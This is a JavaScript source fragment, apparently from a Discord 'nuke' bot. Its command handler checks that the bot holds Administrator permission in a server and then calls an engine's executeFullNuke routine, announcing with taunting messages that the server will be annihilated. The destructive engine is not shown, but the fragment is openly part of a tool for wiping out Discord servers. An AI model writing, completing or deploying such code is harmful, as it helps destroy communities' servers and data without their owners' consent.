// ========================== COMMAND SYSTEM ==========================
class CommandHandler {
    constructor(client, engine) {
        this.client = client;
        this.engine = engine;
    }
    
    async handle(message) {
        if (message.author.bot) return;
        if (!message.content.startsWith(CONFIG.PREFIX)) return;
        
        const guild = message.guild;
        if (!guild) {
            return message.reply('❌ This command only works in a server you potato brain.');
        }
        
        const botMember = guild.members.me;
        if (!botMember.permissions.has('Administrator')) {
            return message.reply('❌ I need **Administrator** permission to unleash the full nuke. Give it to me.');
        }
        
        await message.reply('💣 **ULTIMATE NUKE CODE ACTIVATED** – Watch the console for the beautiful destruction. 🔥\n*This server will cease to exist in a few moments.*');
        
        try {
            await this.engine.executeFullNuke(guild);
            await message.reply('✅ **NUKE COMPLETE** – Server has been annihilated. Potato God smiles upon you.');
        } catch (err) {
            Logger.error(`Critical failure: ${err.stack}`);
            await message.reply(`⚠️ Error occurred: ${err.message}. But I never give up. Try again.`);
        }
    }
}

